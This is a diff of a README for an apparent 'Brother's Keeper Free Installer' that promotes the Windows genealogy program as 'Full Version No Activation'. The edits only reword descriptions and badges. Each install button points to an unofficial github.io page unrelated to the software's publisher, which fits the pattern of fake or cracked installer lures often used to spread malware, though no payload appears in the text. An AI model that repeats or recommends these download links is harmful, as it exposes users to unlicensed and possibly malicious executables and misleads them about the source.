@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Genealogy-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Brother's Keeper Free Installer** — Brother's Keeper is a Windows genealogy software with a long history among family history researchers. Works without internet access, no account required. Full offline installation.
+**💻 Brother's Keeper Free Installer** — Brother's Keeper is a genealogy software for Windows for recording and organizing family history data. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -17,12 +17,12 @@
 </p>
 
 <p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=💻+Brothers+Keeper+Free+Installer;⭐+Full+Version+No+Activation;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
+  <img src="https://readme-typing-svg.herokuapp.com?color=E63946&size=28&center=true&vCenter=true&width=900&lines=💻+Brother's+Keeper+Free+Installer;⭐+Full+Version+No+Activation;🌟+Full+Offline+Installation+2026;🔥+No+Account+Required" />
 </p>
 
 <div align="center">
 
-[![⬇ Install Brothers Keeper](https://img.shields.io/badge/⬇_Install_Brothers%20Keeper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Brother's Keeper](https://img.shields.io/badge/⬇_Install_Brother's+Keeper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Brother's Keeper
 
-Brother's Keeper is a Windows genealogy software with a long history among family history researchers. It provides person records, family trees, event tracking, GEDCOM import/export, and a wide variety of report formats for documenting genealogical research.
+Brother's Keeper is a genealogy software for Windows for recording and organizing family history data. Manage thousands of family members, enter relationships, vital statistics, and notes, and generate family tree reports and ancestor charts. Brother's Keeper has been a stalwart genealogy tool for decades with a simple interface focused on data entry and relationship tracking.
 
 ---
 
 ## ❌ Problem: Brother's Keeper is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **Dated Interface** — UI significantly older than modern genealogy software
-- **Steep Learning Curve** — Complex interface requires investment to use effectively
-- **Competition** — Gramps (free) and MacFamilyTree offer more modern genealogy experiences
+- **Windows Only** — No macOS or cross-platform version
+- **Dated Interface** — Visual design reflects the software's long history
+- **Modern Features** — Lacks modern features like DNA integration or smart matching
+- **Learning Curve** — Genealogy database concepts require adjustment for new users
 
 ---
 
@@ -81,7 +81,7 @@ Brother's Keeper is a Windows genealogy software with a long history among famil
 
 <div align="center">
 
-[![⬇ Install Brothers Keeper](https://img.shields.io/badge/⬇_Install_Brothers%20Keeper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Brother's Keeper](https://img.shields.io/badge/⬇_Install_Brother's+Keeper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Brother's Keeper is a Windows genealogy software with a long history among famil
 
 ---
 
-**Brother's Keeper Free Installer** — Brother's Keeper is a Windows genealogy software with a long history among family history researchers. Install without internet connection today!
+**Brother's Keeper Free Installer** — Brother's Keeper is a genealogy software for Windows for recording and organizing family history data. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Brothers Keeper](https://img.shields.io/badge/⬇_Install_Brothers%20Keeper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Brother's Keeper](https://img.shields.io/badge/⬇_Install_Brother's+Keeper-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
